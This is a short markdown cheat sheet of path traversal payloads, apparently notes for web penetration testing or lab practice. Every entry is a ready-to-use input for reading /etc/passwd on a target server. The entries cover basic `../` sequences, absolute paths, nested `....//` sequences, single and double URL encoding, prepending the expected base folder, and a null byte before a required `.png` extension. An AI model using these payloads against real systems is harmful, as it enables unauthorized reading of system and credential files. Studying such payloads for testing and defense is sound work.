## basic

> `../../../etc/passwd`

# Common obstacles 

## traversal sequences blocked
#### absolute path
> `/etc/passwd`

#### nested traversal sequences 
> `....//....//....//etc/passwd`

#### URL encode
- This results in `%2e%2e%2f` and `%252e%252e%252f` respectively. Various non-standard encodings, such as `..%c0%af` or `..%ef%bc%8f`
> `..%252f..%252f..%252fetc/passwd`

## expected base folder

example: `/var/www/images` 
> `filename=/var/www/images/../../../etc/passwd`

## expected file extension

example: `.png`
> `filename=../../../etc/passwd%00.png`